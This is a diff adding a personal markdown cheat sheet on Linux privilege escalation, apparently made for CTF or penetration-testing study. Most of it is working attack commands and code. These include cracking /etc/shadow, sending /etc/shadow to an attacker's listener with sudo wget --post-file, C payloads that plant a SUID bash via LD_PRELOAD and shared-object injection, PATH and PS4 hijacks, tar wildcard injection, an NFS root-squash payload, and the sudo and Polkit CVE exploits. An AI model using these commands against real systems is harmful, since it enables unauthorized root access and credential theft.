@@ -1,0 +1,324 @@
+## Linux privilege escalation - zero_or_1
+
+
+First : Machine enumeration :-- 
+
+----------------------------------
+1. enumerate machine informations 
+
+uname -a 
+cat /proc/version 
+cat /etc/issue ==> distrbution 
+lscpu ==> information about arcticture and other cpu model ..etc 
+sudo -V ==> sudo information and version 
+
+
+2. enumerate services 
+
+ps aux ==> this will enumearate services and what user is running that service 
+
+ps aux | grep "root" ==> to just enumerate what tasks are running as the root user 
+
+u can also use ps aux | grep "urUser" to see what task this user is using
+----------------------------------
+Second : User enumeration :--     |
+----------------------------------
+whoami ==> my user 
+id ==> to enumerate user and group id 
+sudo -l ==> to see which programs are running as root user and to exploit them "GTFObins is the key"
+cat /etc/passwd ==> to enumerate all users in the machine "cut -d : -f 1" 
+cat /etc/shadow ==> if we can read it , we can crack the users hashes 
+cat /etc/group 
+we can also do history to see what we miss in the history 
+
+* sudo su - ==> try to switch the user with the same password :) *
+----------------------------------
+
+Third : Netwrok enmumeration :-- 
+
+----------------------------------
+ifconfig 
+ip a ==> to see the ip address and the network u in , and the brodcast scope 
+
+route or ip route
+
+arp -a or ip neigh ==> to see what is stale and what its reachable 
+
+netstat -ano ==> to see what ports are open and what communication happen here with other machines
+----------------------------------
+
+
+------------------------------------------------------------------------------------------------------
+
+@@@@@@@@@@@@@@@@@@@@@@@@
+@@@ Priv Esc Techniques 
+@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+
+1. Kernel exploit :--
+
+uname -a to see the kernel version and search for public exploit for it and use it
+or u can also use Linux exploit suggestor tool to find kernel exploits for the machine 
+
+
+2. Escalation via stored password :-- 
+
+we can see the history or the bash_history file 
+we can find all stored passwords via one line commands 
+PayloadAllThings -> linux priv esc -> Looting for passwords 
+
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+
+we can automate all of this with linPeas tool 
+maybe also there is service running and has a hidden passwords inside it -> ps aux 
+
+
+3. Escalation via weak file permissions :--
+
+the targets are /etc/passwd and /etc/shadow files 
+
+- if we have a write access in /etc/passwd we can delete the x in root or add new root user , or also we can change our current user id to 0 and group to 0 to have a root access 
+- if we can read the shadow file , we can crack the hash password of the user , we can do that via copying the passwd file and the shadow file externally and use the unshadow tool to combine them 
+then we can delete all unneeded users 'with no hash' and crack the root user passwd
+we need first to identify the hash type, search about hashcat hash types search about the first hash character and define the hash number --> hashcat -m $HashNumber $usersWithHash rockyou.txt -O
+
+
+4. Escalation via SSH keys Hunting 
+
+also in PasswordAllthings -> methodology and resources -> linux priv esc -> looting for passwords 
+few nice command to automate the shh key searhing in the machine .
+also linPeas will automate this .	
+
+
+
+
+5. sudo shell escaping 
+
+sudo -V ==> To see the version of sudo 
+sudo -l , to see what programs are running as root 
+just use GTFObins and search for the binary program that running as root and go down to the sudo priv
+
+
+
+6. Escalation via intended functionality 
+
+like apache2 running as root and use it to read the /etc/shadow file , sudo apache2 -f /etc/shadow
+also the wget trick , setting up a listener in the attacker machine and send the /etc/shadow file 
+sudo wget --post-file=/etc/shadow $ip:$port   ==> sending the etc/shadow to attacker machine 
+also search more on the internet for another tricks 
+
+
+
+7. Escalation via LD_PRELOAD 
+
+when doing sudo -l , we may find the env variable : env_reset , env_keep+=LD_PRELOAD "preloading"
+it's a feautre in most unix system to load libraries , we need to write a C library ;
+we will write a C function to unset env and set the gid and uid to 0 , then run the bin/bash 
+also compile the C code to .so and make sudo LD_preload=/home/user/MyCfile.so apache2
+search for it in google 
+
+
+
+8. Escalation via CVE-2019-14287 
+
+Search about it , it's a really good trick , when we do a sudo -l and find the (All, !root) NoPasswd
+sudo -u#-1 /bin/bash ==> -u#-1 will return 0 , this is root id
+
+
+
+9. Escalaltion via CVE-2019-18634 "BOF"
+
+we need to check the sudo version ==> sudo -V and search for any exploit for it , '> 1.8.26'
+This cve is about the pwfeedback lib that enabled in /etc/sudoers , this lib is macking stars symbol 
+when entering the sudo password :) 
+
+
+
+10. SUID privilage escalation :- 
+
+find / -type f -perm -04000 -ls 2>/dev/null
+writeup :- https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/
+
+
+
+11. SUID Escalation via Shared Object Injection "SO injection"
+
+find / -type f -perm -04000 -ls 2>/dev/null
+if we found a suid-so belongs to staff , we can dig into it 
+we must run the sudi-so program to see what is happening 
+we can use strace with the binary program to see what's happen behin the scence 
+strace /usr/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+if there is any .so file in our user area or any public place we can overwrite it , test if we can write or read the file , then modify it or overwrite it 
+write our C code and compile it to so , gcc -shared -fPIC -o /path/to/file/we/need/to/overwrite/HisName.so , and re run the sudi-so program :') , we can also make the directory from zero to overwrite 
+Our C code is here 
+
+"""""""
+#include <stdio.h>
+
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+
+system(“cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p”);
+
+}
+""""""""
+
+
+
+12. Escalation via Binary Symlinks "related to nginx" "not manually to find" :- 
+
+esclation from www-data , run linux exploit suggester , if there is nginxed-root.sh CVE , we got it
+we need to check if SUID is set to sudo , and if we have a rwx in the /var/log/nginx 
+we can replace the logs files and exploit "create a malicious symlink"
+./nginxed-root.sh /var/log/nginx/error.log , and we got root via nginx 
+
+
+
+13. Escalation via Environmental Variables "SUID also"
+
+env ,to see the env vars 
+run the suid find command , if we found the /usr/local/bin/env or env-2 belongs to staff with suid 
+we can run strings our strace as usual , if it's using any service , we can manipulate the service :)
+The suid env is knowing the service from the path , we can make a malicious service from another path
+make a C program to escalate out privilege named service in /tmp 
+update the path , export PATH=/tmp:$PATH , then print it to check if tmp is the first path to search
+run the binary and we r root :) 
+Ok , what if the service is calling a direct path to the real service ?? :O 
+we can make a function with the same service path as name and export it , /usr/bin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+then , export -f /usr/bin/service "to export our service"
+then let's run the binary program , and we r root :')
++++  another method 
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
+
+
+
+14. Escalation via Capabilities :- 
+
+let's check for capabilities , getcap -r / 2>/dev/null , cap_setuid+ep => permit everything "all caps are enabled"	
+as example if we found python2.7 
+we will do this , /usr/bin/python2.7 -c 'import os ; os.setuid(0); os.system("/bin/bash")'
+we are root, + we don't need to use sudo at all !! , there is more tricks like tar , ..etc 
+
+
+
+15. Scheduled tasks "cron jobs" :- 
+
+we can 
+cat /etc/crontab 
+grep CRON /var/log/syslog 
+to enumerate basic info , hourly , daily and monthly jobs and every m h dom mon dow  
+systemctl list-timers --all ==> to list all timers 
+more resource :-
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#scheduled-tasks
+
+we can also use this tool to watch cronjobs 
+https://github.com/DominicBreuker/pspy
+
+
+
+16. Escalation via Cron Paths 
+
+if there is a scheduled file down inside cronjobs , let's see the path off this file , if the PATH var first load the user directory , we can overwrite it to cp /bin/bash to tmp and chmod ..etc , then make our file executable , then check ls -la the tmp to see if the bash file overwritten and execute it 
+wait a minute and execute , u r root now 
+
+
+
+17. Escalation via Cron Wildcards 
+
+https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/wildcard/backupORanything/shell.sh
+chmod +x shell.sh
+touch /path/to/wildcard/--checkpoint=1
+touch /path/to/wildcard/--checkpoint-action=exec=sh\ shell.sh
+if we did a ls-la will see our files checkpoints and new shell.sh 
+check the tmp if the bash created and /tmp/bash -p , WE are root
+
+
+
+18. Escalation via Cron File Overwrites
+
+It's simple , If we have any cronjob file down and we can delete that file , we can overwrite it with malicious one 
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/file/overwrite.sh
+chmod +x overwrite.sh
+check the /tmp/bash time and run it 
+/tmp/bash -p ==> Now we are root 
+
+
+
+19. Escalation via NFS Root Squashing :-
+
+first , cat /etc/exports 
+If we found the /tmp with no_root_squash option , That mean this folder can be shareable and can be mounted 
+showmount -e $IP
+/tmp *
+mkdir /me/forMount
+mount -o rw,vers=2 $IP:/tmp /me/forMount 
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0 }' > /me/forMount/payload.c
+cat it to check 
+gcc /me/forMount/payload.c /me/forMount/payload
+
+------->  ignore errors  <-----
+
+chmod +s /me/forMount/payload
+-> check the tmp in the machine and run the C executable file ./payload ==> we r rooot
+
+
+
+## Docker exploitation and escalation :-
+
+let's run the linEnum and see if we are hosting docker ,
+Lets go to GTFObins directly , and run bash with docker 
+
+
+
+20. CVE-2021-4034 (Policy toolkit) or Polkit :- "There's a great tryHackMe room for it"
+
+Literally in every linux unix distro by default , since released in 2009 
+exploit ==> https://github.com/arthepsy/CVE-2021-4034
+compile it 
+gcc cve-2021-4034.c -o exploit
+chmod +x exploit 
+./exploit 
+we r root  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
